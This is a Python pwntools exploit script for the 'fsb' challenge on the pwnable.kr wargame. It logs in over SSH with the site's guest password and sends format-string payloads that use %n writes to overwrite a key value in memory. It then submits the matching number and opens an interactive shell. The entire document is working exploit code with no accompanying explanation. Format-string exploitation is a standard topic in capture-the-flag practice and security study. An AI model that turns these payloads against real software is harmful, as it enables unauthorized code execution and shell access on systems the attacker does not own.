#!/usr/bin/env python3

from pwn import *

exe = ELF("./fsb")

context.binary = exe


def conn():

    session = ssh('fsb', 'pwnable.kr', password='guest', port=2222)

    r = session.process(['/home/fsb/fsb'])

    return r


def main():
    r = conn()

    r.recvuntil('(1)')
    r.recvline()
    info ("overwriting the stack addresses with key addresess")
    r.sendline("%" + str(exe.sym.key) + "x%14$n" + 'AAAA%15$n')

    r.recvuntil('(2)')
    info ('filling key with our very funny number.')
    r.sendline('%21$n%69x%20$n')
    #r.interactive()
    info('skipping to key enter')
    r.recvuntil('(3)')
    r.sendline('1'*99)
    r.recvuntil('(4)')
    r.sendline('1'*99)
    r.recvuntil('key : ')
    info('sending our funny number')
    r.sendline('69')
    info('enjoy shell! (or maybe not if it fucked up sry)')
    r.interactive()


if __name__ == "__main__":
    main()
